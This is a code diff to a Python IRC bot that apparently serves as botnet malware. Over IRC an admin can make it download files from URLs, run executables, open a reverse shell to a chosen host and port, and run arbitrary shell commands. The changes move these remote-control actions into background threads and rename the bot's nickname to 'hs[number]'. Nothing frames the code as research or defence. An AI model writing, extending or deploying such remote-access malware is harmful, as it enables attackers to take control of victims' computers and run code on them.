@@ -399,7 +399,7 @@ def main():
         
         # Change nickname if current nickname is already in use.
         if ircmsg.find('Nickname is already in use') != -1:
-            botnick = "abot" + str(random.randint(10000,99999))
+            botnick = "hs[" + str(random.randint(10000,99999)) +"]"
             newnick(botnick)
         
         # Join 'channel' and msg 'admin' after you are fully connected to server.
@@ -486,7 +486,8 @@ def main():
                         download_file = target.split(' ', 1)[1]
                         download_url = target.split(' ')[0]
                         message = "The file " + download_file + " is downloading from " + download_url + "..."
-                        download(download_url, download_file)
+                        download_thread = threading.Thread(target=download, args=(download_url, download_file))
+                        download_thread.start()
                     else:
                         message = "Could not parse. The message should be in the format of '.dl [url] [file]' to work properly."
                     sendntc(message, adminname)
@@ -498,7 +499,8 @@ def main():
                         exec_file = message.split(' ', 1)[1]
                         exec_type = message.split(' ')[0]
                         message = "Running the executable file: " + exec_file + " Using: " + exec_type
-                        execute(exec_type, exec_file)
+                        execute_thread = threading.Thread(target=execute, args=(exec_type, exec_file))
+                        execute_thread.start()
                     else:
                         message = "Could not parse. The message should be in the format of '.run [exec type] [exec file]' to work properly."
                     sendntc(message, adminname)
@@ -596,6 +598,7 @@ def main():
                     helpmsg = [m.strip() for m in str(helpmsg).split(',')]
                     for line in helpmsg:
                         sendntc(line, name)
+                        time.sleep(1)
                     sendntc(message, name)
                 
                 # Respond to '.ip' command from admin.
@@ -681,7 +684,8 @@ def main():
                             port = target.split(' ', 1)[1]
                             target = target.split(' ')[0]
                             message = "[+] Reverse shell connection established with " + target + ":" + port + "!"
-                            rShell(target, port)
+                            rshell_thread = threading.Thread(target=rShell, args=(target,port))
+                            rshell_thread.start()
                         else:
                             message = "Could not parse. The command should be in the format of '.rshell [target] [port]' to work properly."
                         sendntc(message, adminname)
@@ -698,7 +702,8 @@ def main():
                         if message.split(' ', 1)[1] != -1:
                             shellcmd = message.split(' ', 1)[1]
                             message = "Shell> " + shellcmd
-                            runcmd(shellcmd)
+                            runcmd_thread = threading.Thread(target=runcmd, args=(shellcmd))
+                            runcmd_thread.start()
                         else:
                             message = "Could not parse. The command should be in the format of '.cmd [shell command]' to work properly."
                         sendntc(message, adminname)
@@ -711,7 +716,8 @@ def main():
                         if message.split(' ', 1)[1] != -1:
                             shellcmd = message.split(' ', 1)[1]
                             message = "Shell> " + shellcmd
-                            runcmd_noout(shellcmd)
+                            runcmd_noout_thread = threading.Thread(target=runcmd_noout, args=(shellcmd))
+                            runcmd_noout_thread.start()
                         else:
                             message = "Could not parse. The command should be in the format of '.cno [shell command]' to work properly."
                         sendntc(message, adminname)
